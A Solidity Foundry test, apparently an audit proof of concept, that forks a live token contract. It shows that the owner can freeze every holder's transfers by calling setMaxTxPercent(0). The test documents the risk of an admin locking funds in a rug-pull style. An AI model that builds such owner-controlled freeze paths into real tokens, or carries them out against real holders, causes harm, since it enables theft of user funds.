```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IWEB3 {
    function owner() external view returns (address);
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function _maxTxAmount() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
}

contract ExploitTest is Test {
    address constant WEB3_TOKEN = 0xd0c4bc1b89bbd105eecb7eba3f13e7648c0de38f;
    IWEB3 public web3 = IWEB3(WEB3_TOKEN);

    address deployer;
    address user = address(0xBEEF);
    address recipient = address(0xCAFE);

    function setUp() public {
        deployer = web3.owner();
        vm.label(deployer, "Deployer/Owner");
        vm.label(user, "User");
        vm.label(recipient, "Recipient");

        // Transfer some tokens to user so they have a balance to work with
        uint256 amount = 1000 * 10**web3.decimals(); // 1000 tokens
        vm.prank(deployer);
        web3.transfer(user, amount);
        assertEq(web3.balanceOf(user), amount, "User should have tokens");
    }

    function testOwnerCanLockUserFundsBySettingMaxTxToZero() public {
        // Verify initial maxTxAmount is non-zero
        uint256 initialMaxTx = web3._maxTxAmount();
        assertGt(initialMaxTx, 0, "Initial maxTxAmount should be > 0");

        // Owner sets maxTxPercent to 0 → maxTxAmount becomes 0
        vm.prank(deployer);
        web3.setMaxTxPercent(0);

        // Confirm maxTxAmount is now zero
        assertEq(web3._maxTxAmount(), 0, "maxTxAmount should be 0 after setMaxTxPercent(0)");

        // User attempts to transfer 1 token (any positive amount) – should revert
        uint256 transferAmount = 1 * 10**web3.decimals();
        vm.expectRevert(bytes("Transfer amount exceeds the maxTxAmount."));
        vm.prank(user);
        web3.transfer(recipient, transferAmount);
    }
}
```
